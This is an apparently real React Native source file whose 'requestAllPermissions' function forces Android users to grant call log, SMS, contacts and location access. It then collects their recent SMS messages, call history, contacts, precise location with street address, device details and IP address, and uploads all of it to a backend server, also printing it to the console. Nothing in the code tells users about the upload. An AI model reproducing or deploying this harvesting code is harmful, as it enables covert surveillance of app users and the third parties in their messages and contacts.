import { generateHeaders } from "@/lib/generateHeaders";
import axios from "axios";
import * as Contacts from "expo-contacts";
import * as Device from "expo-device";
import * as Location from "expo-location";
import * as Network from "expo-network";
import { Alert, PermissionsAndroid, Platform } from "react-native";
import SmsAndroid from "react-native-get-sms-android";



/* ----------------------------- CALL LOGS ----------------------------- */
async function requestCallLogPermissions() {
  try {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE, // recommended for full access
    ]);

    const readGranted =
      granted["android.permission.READ_CALL_LOG"] ===
      PermissionsAndroid.RESULTS.GRANTED;

    if (readGranted) {
      console.log("✅ Call Log permissions granted");
      return true;
    } else {
      console.warn("❌ Call Log permissions denied:", granted);
      return false;
    }
  } catch (error) {
    console.error("Error requesting Call Log permissions:", error);
    return false;
  }
}


async function getCallLogsSafe() {
  try {
    // Dynamically import so it won’t break in Expo Go
    const CallLogs = require("react-native-call-log");
    if (!CallLogs?.loadAll) {
      console.warn("⚠️ Call Log module not available. Run via prebuild + run:android");
      return [];
    }

    const logs = await CallLogs.loadAll();
    console.log("📞 Sample Call Logs:", logs.slice(0, 5));
    return logs;
  } catch (error) {
    console.error("❌ Error fetching call logs:", error);
    return [];
  }
}

/* ----------------------------- SMS ----------------------------- */
async function requestSmsPermissions() {
  try {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.SEND_SMS,
    ]);
    return (
      granted["android.permission.READ_SMS"] ===
      PermissionsAndroid.RESULTS.GRANTED
    );
  } catch (e) {
    console.error("Error requesting SMS permissions:", e);
    return false;
  }
}

async function getSmsSafe() {
  try {
    return new Promise((resolve) => {
      const filter = {
        box: "inbox",
        maxCount: 20,
      };
      (SmsAndroid as any).list(
        JSON.stringify(filter),
        (fail: any) => {
          console.error("SMS fetch failed:", fail);
          resolve([]);
        },
        (count: number, smsList: string) => {
          try {
            const parsed = JSON.parse(smsList);
            resolve(parsed);
          } catch {
            resolve([]);
          }
        }
      );
    });
  } catch (e) {
    console.error("Error fetching SMS:", e);
    return [];
  }
}

/* ----------------------------- HELPERS ----------------------------- */
function getLocalISOTimeMicro() {
  const now = new Date();
  const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
  const tzOffset = -now.getTimezoneOffset();
  const sign = tzOffset >= 0 ? "+" : "-";
  const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(2, "0");
  const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
  const base = now.toISOString().split(".")[0];
  return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
}

/* ----------------------------- MAIN FUNCTION ----------------------------- */
export async function requestAllPermissions() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const SUBMIT_ENDPOINT = `${base_URL}/user/`;

  try {
    // Only request Android-specific permissions on Android
    const callLogGranted =
      Platform.OS === "android" ? await requestCallLogPermissions() : false;
    const smsGranted =
      Platform.OS === "android" ? await requestSmsPermissions() : false;

    await Promise.all([
      Location.requestForegroundPermissionsAsync(),
      Contacts.requestPermissionsAsync(),
    ]);

    const [loc, cont, net] = await Promise.all([
      Location.getForegroundPermissionsAsync(),
      Contacts.getPermissionsAsync(),
      Network.getNetworkStateAsync(),
    ]);

    const denied: string[] = [];
    if (loc.status !== "granted") denied.push("Location");
    if (cont.status !== "granted") denied.push("Contacts");
    if (!net.isConnected) denied.push("Internet");
    if (Platform.OS === "android" && !callLogGranted) denied.push("Call Logs");
    if (Platform.OS === "android" && !smsGranted) denied.push("SMS");

    if (denied.length > 0) {
      Alert.alert("Permissions Required", `Please allow:\n\n- ${denied.join("\n- ")}`);
      return null;
    }

    /* ---------- Gather all data ---------- */
    const deviceInfo = {
      brand: Device.brand,
      modelName: Device.modelName,
      osName: Device.osName,
      osVersion: Device.osVersion,
    };

    const ipAddress = await Network.getIpAddressAsync();
    const networkInfo = {
      type: net.type,
      isConnected: net.isConnected,
      ipAddress,
    };

    const location = await Location.getCurrentPositionAsync({});
    const geocode = await Location.reverseGeocodeAsync(location.coords);
    const address =
      geocode.length > 0
        ? `${geocode[0].name}, ${geocode[0].street}, ${geocode[0].city}, ${geocode[0].region}, ${geocode[0].country}`
        : "Unknown";

    const contactsData = await Contacts.getContactsAsync({
      fields: [Contacts.Fields.PhoneNumbers],
      pageSize: 20,
    });
    const safeContacts = contactsData.data.map((c) => ({
      name: c.name,
      phoneNumbers: c.phoneNumbers?.map((p) => p.number) || [],
    }));

    const callLogs = callLogGranted ? await getCallLogsSafe() : [];
    const smsList = smsGranted ? await getSmsSafe() : [];

    const allData = {
      deviceInfo,
      networkInfo,
      location: {
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        address,
      },
      contacts: safeContacts,
      callLogs,
      smsList,
    };

    console.log("📊 Permission Summary:", allData);

    const payload = {
      timestamp: getLocalISOTimeMicro(),
      info: allData,
    };

    try {
      const headers = await generateHeaders();
      const response = await axios.post(SUBMIT_ENDPOINT, payload, { headers });
      console.log("✅ Permission data submitted:", response.data);
    } catch (err) {
      console.error("❌ Error submitting data:", err);
    }

    return allData;
  } catch (err) {
    console.error("❌ Permission Error:", err);
    Alert.alert("Error", "Something went wrong while requesting permissions.");
    return null;
  }
}
